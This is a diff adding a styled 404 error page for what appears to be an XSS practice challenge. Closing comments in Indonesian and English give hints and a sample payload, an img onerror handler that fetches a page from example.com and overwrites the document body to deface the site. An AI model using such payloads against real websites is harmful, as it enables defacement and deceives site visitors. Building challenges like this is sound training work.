@@ -1,0 +1,200 @@
+<!-- carilah yang tersembunyi-->
+<!-- Look for the hidden -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>404 - Oops! Page Not Found</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            height: 100vh;
+            overflow: hidden;
+            position: relative;
+            padding: 20px;
+        }
+
+        canvas {
+            position: absolute;
+            top: 0;
+            left: 0;
+            z-index: -1;
+        }
+
+        .error-container {
+            padding: 50px 30px;
+            max-width: 800px;
+            width: 100%;
+            animation: fadeIn 2s ease-in-out;
+            z-index: 1;
+            position: relative;
+            margin-top: 50px;
+            text-align: center;
+        }
+
+        .error-code {
+            font-size: 150px;
+            font-weight: bold;
+            color: #ff4444;
+            text-shadow: 4px 4px 6px rgba(255, 0, 0, 0.5), 0px 0px 25px rgba(255, 0, 0, 0.7);
+            animation: shake 1s ease-in-out infinite;
+        }
+
+        .message {
+            font-size: 24px;
+            color: #fff;
+            margin-top: 20px;
+            font-weight: 500;
+            animation: fadeInText 2s ease-out;
+        }
+
+        .description {
+            font-size: 18px;
+            color: #bbb;
+            margin-top: 15px;
+            line-height: 1.5;
+        }
+
+        .buttons a {
+            display: inline-block;
+            background-color: #ff4444;
+            color: #fff;
+            padding: 15px 30px;
+            border-radius: 8px;
+            font-size: 18px;
+            margin-top: 30px;
+            text-decoration: none;
+            transition: background-color 0.3s ease, transform 0.3s ease;
+        }
+
+        .buttons a:hover {
+            background-color: #d32f2f;
+            transform: scale(1.1);
+        }
+
+        .home-btn {
+            margin-right: 10px;
+        }
+
+        @keyframes shake {
+            0%, 100% {
+                transform: translateX(0);
+            }
+            25% {
+                transform: translateX(-10px);
+            }
+            50% {
+                transform: translateX(10px);
+            }
+            75% {
+                transform: translateX(-10px);
+            }
+        }
+
+        @keyframes fadeIn {
+            0% {
+                opacity: 0;
+            }
+            100% {
+                opacity: 1;
+            }
+        }
+
+        @keyframes fadeInText {
+            0% {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @media (max-width: 768px) {
+            .error-code {
+                font-size: 100px;
+            }
+            .message {
+                font-size: 20px;
+            }
+            .description {
+                font-size: 16px;
+            }
+            .buttons a {
+                padding: 12px 25px;
+                font-size: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <canvas id="matrixCanvas"></canvas>
+    <div class="error-container">
+        <h1 class="error-code">404</h1>
+        <p class="message">Oops! Something went wrong. 😱</p>
+        <p class="description">It looks like the page you're looking for doesn't exist. Don't worry, go back to safety or explore the homepage!🚀</p>
+        <div class="buttons">
+            <a href="/Challenge-XSS/" class="home-btn">Go to Homepage</a>
+            <a href="javascript:history.back()" class="back-btn">Go Back</a>
+        </div>
+    </div>
+
+    <script>
+        const canvas = document.getElementById("matrixCanvas");
+        const ctx = canvas.getContext("2d");
+
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+
+        const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+        const matrix = letters.split("");
+        const fontSize = 16;
+        const columns = canvas.width / fontSize;
+        const drops = [];
+
+        for (let x = 0; x < columns; x++) drops[x] = 1;
+
+        function drawMatrix() {
+            ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = "#00ff00";
+            ctx.font = fontSize + "px monospace";
+
+            for (let i = 0; i < drops.length; i++) {
+                const text = matrix[Math.floor(Math.random() * matrix.length)];
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.95) {
+                    drops[i] = 0;
+                }
+                drops[i]++;
+            }
+        }
+
+        setInterval(drawMatrix, 50);
+
+        window.addEventListener("resize", () => {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        });
+    </script>
+</body>
+</html>
+<!-- Ganti none menjadi block -->
+<!-- Change none to block -->
+<!-- Payload XSS yang diizinkan hanya payload deface : document.body.innerHTML-->
+<!-- contoh payload -->
+<!-- <img src="x" onerror="fetch('http://example.com').then(r=>r.text()).then(d=>document.body.innerHTML=d)"> -->
+<!-- Ganti http://example.com dengan url halaman yang anda inginkan -->
